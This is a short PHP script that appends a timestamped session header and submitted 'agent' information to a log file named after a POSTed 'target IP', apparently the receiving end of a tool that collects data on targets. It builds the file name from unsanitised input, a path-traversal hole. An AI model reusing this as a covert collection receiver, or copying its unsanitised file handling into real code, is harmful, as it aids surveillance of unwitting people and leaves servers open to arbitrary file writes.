<?php
require_once 'configs.php';

if ($_POST['ip'] != '')
{
	$infos = $_POST['infos'];
	$date = date('Y-m-d H:i:s'); # Date to write in the end of session at the file
	$ip = $_POST['ip'];			 # Your target IP Address
	$start_of_file = "\n\n[Start - $date]:\nAgent: $infos \n\n"; # This will register the start of file

	file_put_contents($path.'file_'.$ip.'.log', $start_of_file, FILE_APPEND);

}
